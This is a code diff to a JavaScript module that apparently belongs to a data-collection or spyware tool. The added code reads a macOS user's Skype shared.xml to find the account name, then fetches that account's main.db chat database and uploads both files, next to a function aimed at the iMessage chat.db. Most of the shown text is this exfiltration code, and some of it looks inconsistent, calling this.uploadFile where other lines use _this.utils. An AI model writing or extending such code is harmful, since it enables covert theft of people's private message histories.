@@ -81,8 +81,6 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
         messagesHistory: function(home) {
             // Library/Messages/chat.db <-- Chat database, and paths to attachments
             // Library/Messages/Attachments/<byte>/<byte>/<uuid>/<file>
-
-
             var _this = this;
             this.fs.getFile(home + '/Library/Messages/chat.db', {
                 success: function(data) {
@@ -92,9 +90,29 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
         },
 
         skypeHistory: function(home) {
-            // Library/Application Support/Skype/shared.xml  <-- Contains username
-            // Library/Application Support/Skype/<username>/main.db  <-- Chat database
-
+            // -- MacOS --
+            // <home>/Library/Application Support/Skype/shared.xml  <-- Contains username
+            // <home>/Library/Application Support/Skype/<username>/main.db  <-- Chat database
+            if ('macos' === this.platform.operatingSystem()) {
+                var _this = this;
+                this.fs.getFile(home + encodeURI('/Library/Application Support/Skype/shared.xml'), {
+                    success: function(data) {
+                        parser = new DOMParser();
+                        xmlDoc = parser.parseFromString(data,"text/xml");
+                        var user = xmlDoc.getElementsByTagName("Default");
+                        if (user.length) {
+                            skypeUser = user[0].textContent;
+                            console.log('Skype username is: ' + skypeUser);
+                            this.fs.getFile(home + encodeURI('/Library/Application Support/Skype/' + skypeUser + '/main.db'), {
+                                success: function(data) {
+                                    this.uploadFile('main.db', data, {});
+                                }
+                            });
+                        }
+                        _this.utils.uploadFile('shared.xml', data, {});   
+                    }
+                });
+            }
 
         }
 
